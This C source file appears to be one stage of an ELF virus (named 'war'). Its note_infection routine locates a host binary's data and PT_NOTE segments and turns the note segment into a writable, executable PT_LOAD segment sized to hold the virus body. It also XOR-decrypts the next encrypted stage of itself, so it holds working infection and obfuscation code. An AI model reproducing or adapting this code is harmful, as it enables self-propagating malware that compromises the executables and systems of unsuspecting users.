#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struct s_host *host, const size_t index)
{
	Elf64_Phdr *segment;

	segment = (Elf64_Phdr *)((void *)host->header + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));

	if ((void *)segment >= (void *)host->header + host->filesize)
		segment = NULL;

	return segment;
}

__attribute__((always_inline)) static inline bool is_data_segment(const Elf64_Phdr *segment)
{
	return segment->p_type == PT_LOAD && segment->p_flags == (PF_W | PF_R);
}

__attribute__((always_inline)) static inline bool is_note_segment(const Elf64_Phdr *segment)
{
	return segment->p_type == PT_NOTE;
}

__attribute__((always_inline)) static inline void update_note_segment(Elf64_Phdr **segment) 
{
	const size_t base = segment[DATA]->p_vaddr + segment[DATA]->p_memsz;
	const size_t padding = base % segment[DATA]->p_align;
	const size_t offset = base + (segment[DATA]->p_align - padding);

	segment[NOTE]->p_vaddr = offset;
	segment[NOTE]->p_paddr = offset;
	segment[NOTE]->p_offset = offset;

	segment[NOTE]->p_filesz = (void *)__exit - (void *)__entry;
	segment[NOTE]->p_memsz = (void *)__exit - (void *)__entry;

	segment[NOTE]->p_type = PT_LOAD;
	segment[NOTE]->p_flags = (PF_X | PF_W | PF_R);
	segment[NOTE]->p_align = segment[DATA]->p_align;
}

__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[RIGHT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
#if LOGGER
	MID_LOGGER("note_infection:\t\t");
#endif

	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	if (context == FAILURE)
		goto label;
	
	Elf64_Phdr *segment = NULL;

	for (register Elf64_Half index = 0; index < host->header->e_phnum; index++)
	{
		if ((segment = get_segment(host, index)) == NULL)
			break ;

		if (is_data_segment(segment) == true)
			host->segment[DATA] = segment;
		if (is_note_segment(segment) == true)
			host->segment[NOTE] = segment;
	}
	
	if (segment == NULL || host->segment[DATA] == NULL || host->segment[NOTE] == NULL)
	{
		context = FAILURE;
		goto label;
	}

	update_note_segment(host->segment);

label:
	update_keychain_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

	header_infection(host, keychain, context);
}
